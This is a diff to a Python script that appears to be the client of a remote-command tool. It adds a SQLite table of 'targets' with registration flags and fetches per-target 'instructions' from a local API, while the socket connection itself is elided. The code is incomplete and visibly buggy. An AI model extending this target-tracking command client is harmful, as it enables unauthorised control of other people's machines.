@@ -7,24 +7,58 @@ import http.server
 import subprocess
 import threading
 import requests
+import sqlite3
 import socket
 import time
 import os
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
-os.system("clear")
+# os.system("clear")
 
 
-def api_host_geter():
-    try:
-        r = requests.get("http://127.0.0.1:5000")
-        result = r.text
-        host = result["host"]
-        port = result["port"]
-        return port,host
-    except Exception as e:
-        return 5,e
+def targetData(command, user_name=None, ID=None):
+    conn = sqlite3.connect('info.db')
+    cursour = conn.cursor()
+
+    cursour.execute("""
+        CREATE TABLE IF NOT EXISTS target_data(
+            id TEXT PRIMAY KEY NOT NULL,
+            target_name TEXT NOT NULL,
+            is_registor text
+        )
+    """)
+
+    if command == 'create_target' and user_name != None and ID != None:
+        try:
+            cursour.execute('INSERT INTO target_data(id, target_name,is_registor) VALUES(?,?,?)',(ID,user_name,'0'))
+            conn.commit()
+            return "Target was created succssefuly"
+        except Exception as e:
+            print(e)
+            return "Something went wronge"
+    elif command == "get":
+        cursour.execute("SELECT * FROM target_data")
+        data = cursour.fetchall()
+        return data
+    elif command == "update":
+        cursour.execute("SELECT * FROM target_data")
+        data = cursour.fetchall()
+        cursour.execute('UPDATE target_data SET is_registor = ? WHERE id = ?',('1',data[0][0]))
+        return 'updated!!!'
+
+
+def apiCommand():
+    ...
+
+
+def apiInfo(target_name, command):
+    if command == 'registor':
+        info = {'token': 'token',"target_name": target_name}
+        r = requests.post("http://127.0.0.1:5000/api/registor_target",params=info)
+    elif command == 'get':
+        info = {'token': 'token'}
+        r = requests.get(f"http://127.0.0.1:5000/api//api/get_instraction/{target_name}",params=info)
 
 def get_host_port(s1):
     for i in range(0,len(s1)):
@@ -84,10 +118,10 @@ def main():
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
     # get the ip address of current hosting machine
-    #host = socket.gethostname()
-    #port = 55554
+    # host = socket.gethostname()
+    # port = 55554
     try:
-        port,host = api_host_geter()
+        port,host = 0,0 # api_host_geter()
         time.sleep(1)
         # trying to connect to the given host and port    
         s.connect((host,port))
@@ -149,12 +183,5 @@ def main():
     s.close()
 
 if __name__== "__main__":
-    while True:
-        r = requests.get("http://127.0.0.1:5000")
-        result = r.text
-        flag = result["flag"]
-        if flag == "go":
-            main()
-        else:
-            pass
-        #   main()
+    print(targetData("create_target",'omer','12345'))
+    ...
